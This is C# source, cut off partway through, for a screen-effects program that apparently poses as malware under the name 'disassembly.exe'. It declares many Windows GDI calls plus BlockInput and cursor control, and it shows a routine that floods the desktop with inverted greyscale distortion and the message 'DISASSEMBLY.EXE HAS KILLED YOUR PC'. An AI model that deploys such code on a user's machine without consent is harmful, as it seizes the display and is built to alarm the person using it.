using disassembly_library;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;

namespace disassembly
{
    public class Class1
    {

        [DllImport("gdi32.dll")]
        static extern IntPtr CreatePen(PenStyle fnPenStyle, int nWidth, uint crColor);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern bool MoveToEx(IntPtr hdc, int X, int Y, IntPtr lpPoint);
        [DllImport("gdi32.dll", SetLastError = true)]
        static extern bool MaskBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, IntPtr hbmMask, int xMask, int yMask, uint rop);
        [DllImport("gdi32.dll")]
        static extern bool LineTo(IntPtr hdc, int nXEnd, int nYEnd);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, Rop dwRop);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        Rop dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, Rop dwRop);
        [DllImport("gdi32.dll", ExactSpelling = true, PreserveSig = true, SetLastError = true)]
        static extern IntPtr Ellipse(IntPtr hdc, int nLeftRect, int nTopRect,
        int nRightRect, int nBottomRect);
        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        BLENDFUNCTION blendFunction);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern bool FloodFill(IntPtr hdc, int nXStart, int nYStart, uint crFill);
        [DllImport("gdi32.dll", EntryPoint = "GdiGradientFill", ExactSpelling = true)]
        public static extern bool GradientFill(
        IntPtr hdc,           // handle to DC
        TRIVERTEX[] pVertex,    // array of vertices
        uint dwNumVertex,     // number of vertices
        GRADIENT_RECT[] pMesh, // array of gradient triangles, that each one keeps three indices in pVertex array, to determine its bounds
        uint dwNumMesh,       // number of gradient triangles to draw
        GRADIENT_FILL dwMode);           // Use only GRADIENT_FILL.TRIANGLE. Both values GRADIENT_FILL.RECT_H and GRADIENT_FILL.RECT_V are wrong in this overload!

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern bool FillRgn(IntPtr hdc, IntPtr hrgn, IntPtr hbr);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateRectRgn(int nLeftRect, int nTopRect, int nRightRect,
        int nBottomRect);
        [DllImport("gdi32.dll")]
        static extern bool Pie(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect,
        int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("gdi32.dll")]
        static extern uint SetPixel(IntPtr hdc, int X, int Y, int crColor);
        [DllImport("gdi32.dll")]
        static extern IntPtr GetPixel(IntPtr hdc, int nXPos, int nYPos);
        [DllImport("gdi32.dll")]
        static extern bool AngleArc(IntPtr hdc, int X, int Y, uint dwRadius,
        float eStartAngle, float eSweepAngle);
        [DllImport("gdi32.dll")]
        static extern bool RoundRect(IntPtr hdc, int nLeftRect, int nTopRect,
        int nRightRect, int nBottomRect, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool DeleteMetaFile(IntPtr hmf);
        [DllImport("gdi32.dll")]
        static extern bool CancelDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern bool Polygon(IntPtr hdc, POINT[] lpPoints, int nCount);
        [DllImport("gdi32.dll")]

        static extern int SetBitmapBits(IntPtr hbmp, int cBytes, RGBQUAD[] lpBits);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Beep(uint dwFreq, uint dwDuration);

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr LoadImage(IntPtr hinst, string lpszName, uint uType,
        int cxDesired, int cyDesired, uint fuLoad);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int DestroyIcon(IntPtr hIcon);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr LoadLibraryEx(IntPtr lpFileName, IntPtr hFile, LoadLibraryFlags dwFlags);

        [DllImport("user32.dll")]
        static extern IntPtr LoadBitmap(IntPtr hInstance, string lpBitmapName);

        [DllImport("user32.dll")]
        static extern IntPtr BeginPaint(IntPtr hwnd, out PAINTSTRUCT lpPaint);

        [DllImport("user32.dll")]
        static extern bool EndPaint(IntPtr hWnd, out PAINTSTRUCT lpPaint);

        [DllImport("gdi32.dll")]
        static extern int SetStretchBltMode(IntPtr hdc, StretchBltMode iStretchMode);

        [DllImport("gdi32.dll")]
        static extern int StretchDIBits(IntPtr hdc, int XDest, int YDest,
        int nDestWidth, int nDestHeight, int XSrc, int YSrc, int nSrcWidth,
        int nSrcHeight, [In] byte[] rgbq, [In] ref BITMAPINFO lpBitsInfo, DIB_Color_Mode dib_mode,
        Rop dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp);

        [DllImport("Gdi32", EntryPoint = "GetBitmapBits")]
        private extern static long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, RGBQUAD[] lpvBits);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateHatchBrush(int iHatch, uint Color);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreatePatternBrush(IntPtr hbmp);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateDIBitmap(IntPtr hdc, [In] ref BITMAPINFOHEADER
        lpbmih, uint fdwInit, IntPtr lpbInit, [In] ref BITMAPINFO lpbmi,
        uint fuUsage);

        [DllImport("gdi32.dll")]
        static extern int SetDIBitsToDevice(IntPtr hdc, int XDest, int YDest, uint
        dwWidth, uint dwHeight, int XSrc, int YSrc, uint uStartScan, uint cScanLines,
        byte[] lpvBits, [In] ref BITMAPINFO lpbmi, uint fuColorUse);

        [DllImport("gdi32.dll")]
        static extern IntPtr SetDIBits(IntPtr hdc, IntPtr hbm, uint start, int line, int lpBits, [In] ref BITMAPINFO lpbmi, DIB_Color_Mode ColorUse);

        [DllImport("user32.dll")]
        static extern bool SetProcessDPIAware();

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint usage, out IntPtr ppvBits, IntPtr hSection, uint offset);

        [DllImport("gdi32.dll")]
        public static extern int GetDIBits(IntPtr hdc, IntPtr hBitmap, uint start, uint cLines, byte[] buffer,
    ref BITMAPINFO lpbmi, uint usage);

        [DllImport("gdi32.dll")]
        public static extern int SetDIBits(IntPtr hdc, IntPtr hBitmap, uint start, uint cLines, byte[] buffer,
            ref BITMAPINFO lpbmi, uint usage);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int MessageBoxTimeout(IntPtr hWnd, string lpText, string lpCaption,
            uint uType, short wLanguageId, int dwMilliseconds);


        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out Point lpPoint);

        [DllImport("user32.dll")]
        static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hdc, int X, int Y, IntPtr hIcon);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern bool FillRect(IntPtr hDC, ref RECT lprc, IntPtr hbr);

        [DllImport("gdi32.dll", CharSet = CharSet.Auto)]
        public static extern bool TextOut(IntPtr hdc, int x, int y, string lpString, int c);

        [DllImport("gdi32.dll")]
        public static extern uint SetTextColor(IntPtr hdc, int crColor);

        [DllImport("gdi32.dll")]
        public static extern uint SetBkColor(IntPtr hdc, int crColor);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);


        [DllImport("gdi32.dll")]
        static extern IntPtr CreateFont(
            int nHeight,          // Height of font (in logical units)
            int nWidth,           // Width of font (0 = default)
            int nEscapement,
            int nOrientation,
            int fnWeight,         // Font weight (400=normal, 700=bold)
            uint fdwItalic,
            uint fdwUnderline,
            uint fdwStrikeOut,
            uint fdwCharSet,
            uint fdwOutputPrecision,
            uint fdwClipPrecision,
            uint fdwQuality,
            uint fdwPitchAndFamily,
            string lpszFace);

        [DllImport("gdi32.dll")]
        public static extern int SetBkMode(IntPtr hdc, int mode);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct RAMP
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Red;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Green;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public UInt16[] Blue;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            /// <summary>
            /// A BITMAPINFOHEADER structure that contains information about the dimensions of color format.
            /// </summary>
            public BITMAPINFOHEADER bmiHeader;

            /// <summary>
            /// An array of RGBQUAD. The elements of the array that make up the color table.
            /// </summary>
            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
            public RGBQUAD[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
            public uint biCompression;

            public void Init()
            {
                biSize = (uint)Marshal.SizeOf(this);
            }
        }

        enum BitmapCompressionMode : uint
        {
            BI_RGB = 0,
            BI_RLE8 = 1,
            BI_RLE4 = 2,
            BI_BITFIELDS = 3,
            BI_JPEG = 4,
            BI_PNG = 5
        }

        enum DIB_Color_Mode : uint
        {
            DIB_RGB_COLORS = 0,
            DIB_PAL_COLORS = 1
        }

        private enum StretchBltMode : int
        {
            STRETCH_ANDSCANS = 1,
            STRETCH_ORSCANS = 2,
            STRETCH_DELETESCANS = 3,
            STRETCH_HALFTONE = 4,
        }

        /// <summary>
        /// The default flag; it does nothing. All it means is "not LR_MONOCHROME".
        /// </summary>
        public const int LR_DEFAULTCOLOR = 0x0000;

        /// <summary>
        /// Loads the image in black and white.
        /// </summary>
        public const int LR_MONOCHROME = 0x0001;

        /// <summary>
        /// Returns the original hImage if it satisfies the criteria for the copy—that is, correct dimensions and color depth—in
        /// which case the LR_COPYDELETEORG flag is ignored. If this flag is not specified, a new object is always created.
        /// </summary>
        public const int LR_COPYRETURNORG = 0x0004;

        /// <summary>
        /// Deletes the original image after creating the copy.
        /// </summary>
        public const int LR_COPYDELETEORG = 0x0008;

        /// <summary>
        /// Specifies the image to load. If the hinst parameter is non-NULL and the fuLoad parameter omits LR_LOADFROMFILE,
        /// lpszName specifies the image resource in the hinst module. If the image resource is to be loaded by name,
        /// the lpszName parameter is a pointer to a null-terminated string that contains the name of the image resource.
        /// If the image resource is to be loaded by ordinal, use the MAKEINTRESOURCE macro to convert the image ordinal
        /// into a form that can be passed to the LoadImage function.
        ///  
        /// If the hinst parameter is NULL and the fuLoad parameter omits the LR_LOADFROMFILE value,
        /// the lpszName specifies the OEM image to load. The OEM image identifiers are defined in Winuser.h and have the following prefixes.
        ///
        /// OBM_ OEM bitmaps
        /// OIC_ OEM icons
        /// OCR_ OEM cursors
        ///
        /// To pass these constants to the LoadImage function, use the MAKEINTRESOURCE macro. For example, to load the OCR_NORMAL cursor,
        /// pass MAKEINTRESOURCE(OCR_NORMAL) as the lpszName parameter and NULL as the hinst parameter.
        ///
        /// If the fuLoad parameter includes the LR_LOADFROMFILE value, lpszName is the name of the file that contains the image.
        /// </summary>
        public const int LR_LOADFROMFILE = 0x0010;

        /// <summary>
        /// Retrieves the color value of the first pixel in the image and replaces the corresponding entry in the color table
        /// with the default window color (COLOR_WINDOW). All pixels in the image that use that entry become the default window color.
        /// This value applies only to images that have corresponding color tables.
        /// Do not use this option if you are loading a bitmap with a color depth greater than 8bpp.
        ///
        /// If fuLoad includes both the LR_LOADTRANSPARENT and LR_LOADMAP3DCOLORS values, LRLOADTRANSPARENT takes precedence.
        /// However, the color table entry is replaced with COLOR_3DFACE rather than COLOR_WINDOW.
        /// </summary>
        public const int LR_LOADTRANSPARENT = 0x0020;

        /// <summary>
        /// Uses the width or height specified by the system metric values for cursors or icons,
        /// if the cxDesired or cyDesired values are set to zero. If this flag is not specified and cxDesired and cyDesired are set to zero,
        /// the function uses the actual resource size. If the resource contains multiple images, the function uses the size of the first image.
        /// </summary>
        public const int LR_DEFAULTSIZE = 0x0040;

        /// <summary>
        /// Uses true VGA colors.
        /// </summary>
        public const int LR_VGACOLOR = 0x0080;

        /// <summary>
        /// Searches the color table for the image and replaces the following shades of gray with the corresponding 3-D color: Color Replaced with
        /// Dk Gray, RGB(128,128,128) COLOR_3DSHADOW
        /// Gray, RGB(192,192,192) COLOR_3DFACE
        /// Lt Gray, RGB(223,223,223) COLOR_3DLIGHT
        /// Do not use this option if you are loading a bitmap with a color depth greater than 8bpp.
        /// </summary>
        public const int LR_LOADMAP3DCOLORS = 0x1000;

        /// <summary>
        /// When the uType parameter specifies IMAGE_BITMAP, causes the function to return a DIB section bitmap rather than a compatible bitmap.
        /// This flag is useful for loading a bitmap without mapping it to the colors of the display device.
        /// </summary>
        public const int LR_CREATEDIBSECTION = 0x2000;

        /// <summary>
        /// Tries to reload an icon or cursor resource from the original resource file rather than simply copying the current image.
        /// This is useful for creating a different-sized copy when the resource file contains multiple sizes of the resource.
        /// Without this flag, CopyImage stretches the original image to the new size. If this flag is set, CopyImage uses the size
        /// in the resource file closest to the desired size. This will succeed only if hImage was loaded by LoadIcon or LoadCursor,
        /// or by LoadImage with the LR_SHARED flag.
        /// </summary>
        public const int LR_COPYFROMRESOURCE = 0x4000;

        /// <summary>
        /// Shares the image handle if the image is loaded multiple times. If LR_SHARED is not set, a second call to LoadImage for the
        /// same resource will load the image again and return a different handle.
        /// When you use this flag, the system will destroy the resource when it is no longer needed.
        ///
        /// Do not use LR_SHARED for images that have non-standard sizes, that may change after loading, or that are loaded from a file.
        ///
        /// When loading a system icon or cursor, you must use LR_SHARED or the function will fail to load the resource.
        ///
        /// Windows 95/98/Me: The function finds the first image with the requested resource name in the cache, regardless of the size requested.
        /// </summary>
        public const int LR_SHARED = 0x8000;

        [StructLayout(LayoutKind.Sequential)]
        struct PAINTSTRUCT
        {
            public IntPtr hdc;
            public bool fErase;
            public RECT rcPaint;
            public bool fRestore;
            public bool fIncUpdate;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)] public byte[] rgbReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left, Top, Right, Bottom;

            public RECT(int left, int top, int right, int bottom)
            {
                Left = left;
                Top = top;
                Right = right;
                Bottom = bottom;
            }

            public RECT(System.Drawing.Rectangle r) : this(r.Left, r.Top, r.Right, r.Bottom) { }

            public int X
            {
                get { return Left; }
                set { Right -= (Left - value); Left = value; }
            }

            public int Y
            {
                get { return Top; }
                set { Bottom -= (Top - value); Top = value; }
            }

            public int Height
            {
                get { return Bottom - Top; }
                set { Bottom = value + Top; }
            }

            public int Width
            {
                get { return Right - Left; }
                set { Right = value + Left; }
            }

            public System.Drawing.Point Location
            {
                get { return new System.Drawing.Point(Left, Top); }
                set { X = value.X; Y = value.Y; }
            }

            public System.Drawing.Size Size
            {
                get { return new System.Drawing.Size(Width, Height); }
                set { Width = value.Width; Height = value.Height; }
            }

            public static implicit operator System.Drawing.Rectangle(RECT r)
            {
                return new System.Drawing.Rectangle(r.Left, r.Top, r.Width, r.Height);
            }

            public static implicit operator RECT(System.Drawing.Rectangle r)
            {
                return new RECT(r);
            }

            public static bool operator ==(RECT r1, RECT r2)
            {
                return r1.Equals(r2);
            }

            public static bool operator !=(RECT r1, RECT r2)
            {
                return !r1.Equals(r2);
            }

            public bool Equals(RECT r)
            {
                return r.Left == Left && r.Top == Top && r.Right == Right && r.Bottom == Bottom;
            }

            public override bool Equals(object obj)
            {
                if (obj is RECT)
                    return Equals((RECT)obj);
                else if (obj is System.Drawing.Rectangle)
                    return Equals(new RECT((System.Drawing.Rectangle)obj));
                return false;
            }

            public override int GetHashCode()
            {
                return ((System.Drawing.Rectangle)this).GetHashCode();
            }

            public override string ToString()
            {
                return string.Format(System.Globalization.CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", Left, Top, Right, Bottom);
            }
        }

        private enum LoadLibraryFlags : uint
        {
            DONT_RESOLVE_DLL_REFERENCES = 0x00000001,
            LOAD_IGNORE_CODE_AUTHZ_LEVEL = 0x00000010,
            LOAD_LIBRARY_AS_DATAFILE = 0x00000002,
            LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 0x00000040,
            LOAD_LIBRARY_AS_IMAGE_RESOURCE = 0x00000020,
            LOAD_WITH_ALTERED_SEARCH_PATH = 0x00000008
        }

        private enum PenStyle : int
        {
            PS_SOLID = 0, //The pen is solid.
            PS_DASH = 1, //The pen is dashed.
            PS_DOT = 2, //The pen is dotted.
            PS_DASHDOT = 3, //The pen has alternating dashes and dots.
            PS_DASHDOTDOT = 4, //The pen has alternating dashes and double dots.
            PS_NULL = 5, //The pen is invisible.
            PS_INSIDEFRAME = 6,// Normally when the edge is drawn, it’s centred on the outer edge meaning that half the width of the pen is drawn
                               // outside the shape’s edge, half is inside the shape’s edge. When PS_INSIDEFRAME is specified the edge is drawn
                               //completely inside the outer edge of the shape.
            PS_USERSTYLE = 7,
            PS_ALTERNATE = 8,
            PS_STYLE_MASK = 0x0000000F,

            PS_ENDCAP_ROUND = 0x00000000,
            PS_ENDCAP_SQUARE = 0x00000100,
            PS_ENDCAP_FLAT = 0x00000200,
            PS_ENDCAP_MASK = 0x00000F00,

            PS_JOIN_ROUND = 0x00000000,
            PS_JOIN_BEVEL = 0x00001000,
            PS_JOIN_MITER = 0x00002000,
            PS_JOIN_MASK = 0x0000F000,

            PS_COSMETIC = 0x00000000,
            PS_GEOMETRIC = 0x00010000,
            PS_TYPE_MASK = 0x000F0000
        };
        public enum Rop : uint
        {
            /// <summary>dest = source</summary>
            SRCCOPY = 0x00CC0020,
            /// <summary>dest = source OR dest</summary>
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            /// <summary>dest = source XOR dest</summary>
            SRCINVERT = 0x00660046,
            /// <summary>dest = source AND (NOT dest)</summary>
            SRCERASE = 0x00440328,
            /// <summary>dest = (NOT source)</summary>
            NOTSRCCOPY = 0x00330008,
            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
            NOTSRCERASE = 0x001100A6,
            /// <summary>dest = (source AND pattern)</summary>
            MERGECOPY = 0x00C000CA,
            /// <summary>dest = (NOT source) OR dest</summary>
            MERGEPAINT = 0x00BB0226,
            /// <summary>dest = pattern</summary>
            PATCOPY = 0x00F00021,
            /// <summary>dest = DPSnoo</summary>
            PATPAINT = 0x00FB0A09,
            /// <summary>dest = pattern XOR dest</summary>
            PATINVERT = 0x005A0049,
            /// <summary>dest = (NOT dest)</summary>
            DSTINVERT = 0x00550009,
            /// <summary>dest = BLACK</summary>
            BLACKNESS = 0x00000042,
            /// <summary>dest = WHITE</summary>
            WHITENESS = 0x00FF0062,
            /// <summary>
            /// Capture window as seen on screen.  This includes layered windows
            /// such as WPF windows with AllowsTransparency="true"
            /// </summary>
            CAPTUREBLT = 0x40000000,
            CUSTOM = 0x00100C85
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        //
        // currently defined blend operation
        //
        const int AC_SRC_OVER = 0x00;

        //
        // currently defined alpha format
        //
        const int AC_SRC_ALPHA = 0x01;

        [StructLayout(LayoutKind.Sequential)]
        public struct GRADIENT_RECT
        {
            public uint UpperLeft;
            public uint LowerRight;

            public GRADIENT_RECT(uint upLeft, uint lowRight)
            {
                this.UpperLeft = upLeft;
                this.LowerRight = lowRight;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TRIVERTEX
        {
            public int x;
            public int y;
            public ushort Red;
            public ushort Green;
            public ushort Blue;
            public ushort Alpha;

            public TRIVERTEX(int x, int y, ushort red, ushort green, ushort blue, ushort alpha)
            {
                this.x = x;
                this.y = y;
                this.Red = red;
                this.Green = green;
                this.Blue = blue;
                this.Alpha = alpha;
            }
        }
        public enum GRADIENT_FILL : uint
        {
            RECT_H = 0,
            RECT_V = 1,
            TRIANGLE = 2,
            OP_FLAG = 0xff
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct GRADIENT_TRIANGLE

        {
            public uint Vertex1;
            public uint Vertex2;
            public uint Vertex3;

            public GRADIENT_TRIANGLE(uint vertex1, uint vertex2, uint vertex3)
            {
                this.Vertex1 = vertex1;
                this.Vertex2 = vertex2;
                this.Vertex3 = vertex3;
            }
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }
        static Random rnd;
        static int x;
        static int y;
        static int right;
        static int left;
        static int top;
        static int bottom;
        const int DIB_RGB_COLORS = 0;
        const int IDI_ERROR = 32513;
        const int IDI_HAND = 32513;    // Same as IDI_ERROR
        const int IDI_WARNING = 32515;
        const int IDI_QUESTION = 32514;

        // Use the actual integer values, not the constant names
        static int[] rndicons = { IDI_ERROR, IDI_HAND, IDI_WARNING, IDI_QUESTION };
        static uint[] colors = {
    0xFF0000, // Bright Red
    0x00FF00, // Bright Green
    0x0000FF, // Bright Blue
    0xFFFF00, // Bright Yellow
    0xFF00FF, // Bright Magenta
    0x00FFFF, // Bright Cyan
    0xFFA500, // Bright Orange
    0xFF1493, // Bright Pink
    0x7CFC00, // Lawn Green (neon)
    0x00FF7F, // Spring Green
    0x1E90FF, // Dodger Blue
    0xFF4500, // Orange Red
    0xADFF2F, // Green Yellow
    0xFF69B4, // Hot Pink
    0x40E0D0, // Turquoise
    0xFF6347, // Tomato
    0xEE82EE, // Violet
    0xFFD700, // Gold
    0x00BFFF, // Deep Sky Blue
    0xFFB6C1  // Light Pink
};
       static string[] text = {
                    "D I S A S S E M B L Y . E X E",
                    "C O D E   I N J E C T I O N",
                    "DISASSEMBLY.EXE HAS KILLED YOUR PC",
                    "C A L L B A C K _ P I N G",
                    "D I S A S S E M B L Y _ D R O N E S",
                    "4 0 4  -  N O T  F O U N D",
                    "C O R R U P T I O N",
                    "S Y S T E M   F A I L U R E",
                    "A B S O L U T E _ S O L V E R"
                };

        static Stopwatch stopwatch = new Stopwatch();
        public static void GreyScale(int duration)
        {
            stopwatch.Start();
            Random rand = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr backupDC = CreateCompatibleDC(hdc);
            IntPtr hdesktop = CreateCompatibleBitmap(hdc, x, y);
            IntPtr hOldBackup = SelectObject(backupDC, hdesktop);

            // Backup the screen
            BitBlt(backupDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);

            // Create DIB for pixel manipulation
            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = x;
            bmi.bmiHeader.biHeight = -y;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0;

            int stride = ((x * 3 + 3) & ~3);
            IntPtr bitsPtr;
            IntPtr hBitmap = CreateDIBSection(hdc, ref bmi, DIB_RGB_COLORS, out bitsPtr, IntPtr.Zero, 0);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            while (stopwatch.ElapsedMilliseconds < duration)
            {
                int rndx = rand.Next(x);
                int rndy = rand.Next(y);

                // Capture screen to DIB
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);

                // Grayscale processing
                byte[] buffer = new byte[stride * y];
                Marshal.Copy(bitsPtr, buffer, 0, buffer.Length);

                for (int rowY = 0; rowY < y; rowY++)
                {
                    int rowStart = rowY * stride;
                    for (int colX = 0; colX < x; colX++)
                    {
                        int i = rowStart + colX * 3;
                        byte b = buffer[i];
                        byte g = buffer[i + 1];
                        byte r = buffer[i + 2];
                        byte gray = (byte)((r + g + b) / 3);
                        buffer[i] = buffer[i + 1] = buffer[i + 2] = gray;
                    }
                }

                Marshal.Copy(buffer, 0, bitsPtr, buffer.Length);
                BitBlt(hdc, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);

                // Effects
                StretchBlt(hdc, rand.Next(2), rand.Next(2), x - rand.Next(5), y - rand.Next(10),
                           memDC, 0, 0, x, y, Rop.SRCAND);

                IntPtr hFont = CreateFont(-50, 0, 0, 0, 1000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                IntPtr oldFont = SelectObject(hdc, hFont);

                uint[] bw = { 0x000000, 0xffffff, 0x000000, 0xffffff };
                SetTextColor(hdc, (int)bw[rand.Next(bw.Length)]);
                SetBkMode(hdc, 1);

                string text = "D I S A S S E M B L Y . E X E";
                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);
                TextOut(hdc, rndx, rndy, text, text.Length);

                // Proper font cleanup
                SelectObject(hdc, oldFont);  // Restore old font FIRST
                DeleteObject(hFont);         // Then delete new font
            }

            // RESTORE SCREEN from backup
            BitBlt(hdc, 0, 0, x, y, backupDC, 0, 0, Rop.SRCCOPY);

            // Cleanup in reverse order
            SelectObject(memDC, oldBitmap);
            SelectObject(backupDC, hOldBackup);
            DeleteObject(hBitmap);
            DeleteObject(hdesktop);
            DeleteDC(memDC);
            DeleteDC(backupDC);
            ReleaseDC(IntPtr.Zero, hdc);  // ReleaseDC, not DeleteDC!

            stopwatch.Stop();
        }
        public static void xes(int duration)
        {
            rnd = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr drawicon = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr pen = CreatePen(0, 20, 0x000000);   // width=2
            IntPtr oldPen = SelectObject(hdc, pen);


            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = x;
            bmi.bmiHeader.biHeight = -y;
